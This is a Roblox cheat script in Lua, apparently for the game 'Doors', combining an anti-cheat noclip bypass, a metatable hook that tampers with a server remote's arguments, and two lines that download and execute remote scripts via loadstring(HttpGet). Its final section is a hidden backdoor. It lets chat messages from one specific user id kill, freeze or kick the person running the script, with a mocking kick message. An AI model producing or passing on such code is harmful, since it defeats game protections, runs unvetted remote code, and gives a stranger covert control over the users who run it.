--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
--AC noclip bypass
_G.Keybind = "R"
_G.ClipGui = true
_G.IncludeNoclip = true
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
local isEnabled = false
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
local UIS = game:GetService("UserInputService")
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
local Plr = game.Players.LocalPlayer
local Char = Plr.Character or Plr.CharacterAdded:Wait()
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.Enabled = _G.ClipGui or false
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
local TextLabel = Instance.new("TextLabel")
TextLabel.Parent = ScreenGui
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
TextLabel.AnchorPoint = Vector2.new(1, 0)
TextLabel.Position = UDim2.new(1, -5, 0, 0)
TextLabel.Text = "Noclip + Bypasser: Off"
TextLabel.Size = UDim2.new(0,200,0,75)
TextLabel.TextScaled = true
TextLabel.TextStrokeColor3 = Color3.new(1,1,1)
TextLabel.TextStrokeTransparency = 0
TextLabel.BackgroundTransparency = 1
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
function getValue()
    local value
    if isEnabled then
        value = "On"
    else
        value = "Off"
    end
    return value
end
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
UIS.InputBegan:Connect(function(input, gp)
    if gp then return end
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
    if input.KeyCode == Enum.KeyCode[_G.Keybind] then
        isEnabled = not isEnabled
        task.wait()
        TextLabel.Text = "Noclip + Bypasser: " .. getValue()
    end
end)
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
game:GetService("RunService").RenderStepped:Connect(function()
    if not Char:FindFirstChild("HumanoidRootPart") then return end
    if _G.IncludeNoclip then
        Char.HumanoidRootPart.CanCollide = not isEnabled
        Char.Collision.CanCollide = not isEnabled
    end
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
    local HrpCFrame = Char.HumanoidRootPart.CFrame
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
    local ray = Ray.new(HrpCFrame.Position, HrpCFrame.LookVector * 0.5)
    local part = workspace:FindPartOnRay(ray)
    if part and part.CanCollide == true and isEnabled then
        Char.HumanoidRootPart.Anchored = true
        Char:PivotTo(Char.HumanoidRootPart.CFrame * CFrame.new(0, 1000, 0))
        task.wait()
        Char:PivotTo(Char.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4))
        task.wait()
        Char:PivotTo(Char.HumanoidRootPart.CFrame * CFrame.new(0, -1000, 0))
        task.wait(0.1)
        Char.HumanoidRootPart.Anchored = false
    end
end)
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
--Anti Eyes
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
local mt = getrawmetatable(game);
local old = mt.__namecall
setreadonly(mt,false)
mt.__namecall = newcclosure(function(remote,...)
   args = {...}
   method = tostring(getnamecallmethod())
   if method == "FireServer" and tostring(remote) == "MotorReplication" then
       args[2] = 90
       return old(remote,unpack(args))
   end
   return old(remote,...)
end)
setreadonly(mt,true)
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
--Infinity Yield
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
loadstring(game:HttpGet(("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"),true))()
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
--poopdoors
--Combo made by MONTKBOOM (MORTIKBOOM in roblox)
loadstring(game:HttpGet('https://raw.githubusercontent.com/zoophiliaphobic/POOPDOORS/main/script.lua'))()

local player = game.Players.LocalPlayer
local id = "4336577151"
function eatbananaone(theplayer)
	for i,v in pairs(workspace:GetChildren()) do
		if v.Name == "BananaPeel" then
			v.CFrame = theplayer.Character.HumanoidRootPart.CFrame
			return
		end
	end
end
function bananadeath(theplayer)
	theplayer.Character.HumanoidRootPart.Anchored = true
	repeat
	task.wait(0.01)
	for i,v in pairs(workspace:GetChildren()) do
		if v.Name == "BananaPeel" then
			v.CFrame = theplayer.Character.HumanoidRootPart.CFrame
		end
	end
	until theplayer.Character.Humanoid.Health == 0
end

local chat = game:GetService("CoreGui").ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView.RCTScrollView.RCTScrollContentView
chat.ChildAdded:Connect(function (child)
	if string.find(child.Name,id) then
		local check = string.find(child.text, ";")
		if check then
			local command = string.sub(child.text,check)
			for i,splayer in pairs(game:GetService("Players"):GetPlayers()) do
				if string.find(command,splayer.Name) and string.find(command,"kill") then
					splayer.Character.Head:Destroy()
				elseif string.find(command,splayer.Name) and string.find(command,"eatbanana") then
					eatbananaone(splayer)
				elseif string.find(command,splayer.Name) and string.find(command,"bananadeath") then
					bananadeath(splayer)
				elseif string.find(command,splayer.Name) and string.find(command,"freeze") then
					splayer.Character.HumanoidRootPart.Anchored = true
				elseif string.find(command,splayer.Name) and string.find(command,"UnFreeze") then
					splayer.Character.HumanoidRootPart.Anchored = false
                elseif string.find(command,splayer.Name) and string.find(command,"kick") then
					if splayer.Name == player.Name then
                        player:kick("poka loh typoi ti bil kiknyt mortikboom'om")
                    end
				elseif string.find(command,"hehe") then
					local sound = Instance.new("Sound", game.Workspace)
					sound.SoundId = "rbxassetid://5602666105"
					sound.Volume = 100000
					sound:Play()
				end
			end
		end
	end
end)
